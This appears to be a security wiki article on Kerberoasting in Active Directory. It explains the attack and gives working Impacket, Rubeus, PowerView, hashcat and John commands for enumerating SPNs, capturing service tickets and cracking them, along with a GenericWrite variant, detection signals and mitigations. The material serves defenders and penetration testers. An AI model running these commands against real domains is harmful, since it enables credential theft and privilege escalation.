---
title: Kerberoasting
slug: kerberoasting
category: attacks
summary: Kerberoasting is an Active Directory attack where any authenticated domain user requests a Kerberos service ticket for a service-account-owned SPN and cracks the ticket's encryption offline to recover the service account's password.
related: [kerberos, active-directory, as-rep-roasting, hashcat, bloodhound, pass-the-hash]
aliases: [Kerberoast, Roasting Service Tickets]
updated: 2026-05-25
---

**Kerberoasting** is an [Active Directory](/wiki/active-directory) attack — possibly the load-bearing one for internal Windows engagements — where any authenticated domain user requests a [Kerberos](/wiki/kerberos) service ticket (TGS) for a service-account-owned Service Principal Name (SPN), then cracks the ticket's encryption offline to recover the service account's plaintext password.

Discovered and named by Tim Medin in 2014. By 2026 it is *the* canonical credential-acquisition primitive in AD attacks because it works against modern domains, requires only an authenticated low-privileged user, and the offline cracking step is undetectable.

## Why it works

Kerberos's design lets any authenticated user request a service ticket for any service. The Key Distribution Center (KDC, which is the Domain Controller) issues the ticket encrypted with the *service account's* password-derived key. This is intentional: the service uses its key to decrypt the ticket and authenticate the user.

The attack exploits two facts:

1. **The attacker can obtain the ticket without ever proving they have a legitimate reason for it.** The KDC doesn't check whether you're actually about to use the service — it just issues the ticket.

2. **The ticket is encrypted with the service account's key.** If the service account has a weak password, the attacker can crack the ticket offline at billions of attempts per second — completely outside the AD's visibility.

Service accounts are notorious for weak passwords because they're:

- Set once during deployment and rarely rotated.
- Often documented in internal wikis or scripts.
- Set by developers/admins without security oversight.
- Often human-memorable like `Sql2020!`, `SvcAccount1!`, `Backup2019!`.

A weak password drops in seconds; a strong (~30 character random) password is computationally infeasible.

## The chain end-to-end

**Step 1: Find SPNs.** Any authenticated domain user can enumerate Service Principal Names via LDAP:

```bash
# Impacket — Linux/WSL, no Windows host needed
GetUserSPNs.py contoso.local/user:password -dc-ip 10.0.0.10

# Rubeus — Windows-native
Rubeus.exe kerberoast /stats

# PowerView (PowerShell)
Get-DomainUser -SPN | select samaccountname,serviceprincipalname
```

The output lists every user-account-bound SPN. Computer-account SPNs aren't useful (machine accounts have 120-character random passwords that won't crack).

**Step 2: Request and capture TGS hashes.**

```bash
# Capture every TGS to a file in hashcat-readable format
GetUserSPNs.py contoso.local/user:password -dc-ip 10.0.0.10 -request -outputfile krb.hash

# Rubeus equivalent
Rubeus.exe kerberoast /outfile:krb.hash /nowrap
```

The captured hashes look like:

```
$krb5tgs$23$*SQLServer$contoso.local$contoso.local/MSSQLSvc/sql01.contoso.local*$<hex>
```

The `$23$` indicates RC4-HMAC encryption (etype 23). Modern environments often default to AES (etype 17/18) but RC4 remains widely supported and many service accounts still have it as their primary key.

**Step 3: Crack offline.**

```bash
# hashcat mode 13100 for Kerberos 5 TGS-REP
hashcat -m 13100 krb.hash /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule

# John the Ripper equivalent
john --format=krb5tgs --wordlist=rockyou.txt krb.hash
```

A weak service-account password (`Sql2020!`, `Backup1!`, `Spotnik123`) cracks within minutes.

**Step 4: Use the recovered password.**

Once you have the service account's password, you can authenticate as that account anywhere it has access. Service accounts are typically over-privileged — they often have local admin on multiple servers, sometimes Domain Admin equivalents from poorly-scoped delegation.

Feed it into [BloodHound](/wiki/bloodhound) to find paths from your new identity to Domain Admin.

## Variants

**AES-only Kerberoasting:** Modern environments may have `msDS-SupportedEncryptionTypes` set to AES-only on user accounts (no RC4). In this case the captured ticket is AES-128 or AES-256 — still crackable but slower (~50-100x harder than RC4). The 2022 hashcat update added efficient AES Kerberos cracking modes.

**Targeted Kerberoasting via GenericWrite:** If you have `GenericWrite` on a user object (but not `GenericAll`), you can:

1. Add a fake SPN to that user object.
2. Request a TGS for the fake SPN.
3. Crack offline.
4. Remove the SPN to clean up.

This is the [BloodHound](/wiki/bloodhound) `GenericWrite → Kerberoastable` edge in action.

## Detection

The defender side:

- **Event ID 4769** — Kerberos Service Ticket Granted. Volume + encryption-type filter:
  - Unusual TGS request volume from a single user.
  - Encryption type 23 (RC4-HMAC) requests against accounts that should only issue AES tickets.
  - TGS requests for many distinct service accounts from one source.

- **Honeypot service accounts.** Create user accounts with SPNs, no actual service behind them, monitored alerts on TGS-for-this-SPN events. Any roast against the honeypot is a high-fidelity attack signal.

- **The "kerberoast" technique itself isn't detectable** at the cryptographic step — the offline crack is invisible. Detection is at the *request* step, which the attacker can spread across days to defeat threshold alerts.

## Mitigation

- **Long, random service-account passwords.** A 30-character random password makes Kerberoasting computationally infeasible. The single biggest defense.
- **Group Managed Service Accounts (gMSA / dMSA).** AD-managed service accounts whose passwords rotate automatically (default 30 days). Passwords are never visible to administrators; computers retrieve them dynamically. Eliminates the "service account password is `Welcome1`" problem.
- **AES-only encryption.** Setting `msDS-SupportedEncryptionTypes` to AES-only on user accounts forces tickets to be AES-encrypted, raising the cracking bar significantly. Some legacy services break — test before global rollout.
- **Audit pre-2012 service accounts.** Anything created during the WindowsServer 2008 era or earlier is more likely to have a memorable password. Inventory and rotate.
- **Lateral-movement detection** as a fallback — even if Kerberoasting succeeds, the *use* of the recovered credentials should trigger detection signatures.

## Related: [AS-REP roasting](/wiki/as-rep-roasting)

A neighboring AD attack. AS-REP roasting targets accounts with `Do not require Kerberos preauthentication` set — the attacker requests a TGT (not a service ticket) and the KDC responds with one encrypted with the user's key, crackable offline. Lower-frequency in modern environments than Kerberoasting but equally devastating when it works.

## Further reading

- [Tim Medin's original 2014 talk on Kerberoasting](https://www.youtube.com/watch?v=PUyhlN-E5MU).
- [SpecterOps: Kerberoasting Without Mimikatz](https://posts.specterops.io/kerberoasting-without-mimikatz-7c98ad465a83).
- [HackTricks: Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast).
- [ADSecurity: Kerberoasting](https://adsecurity.org/?p=2293).
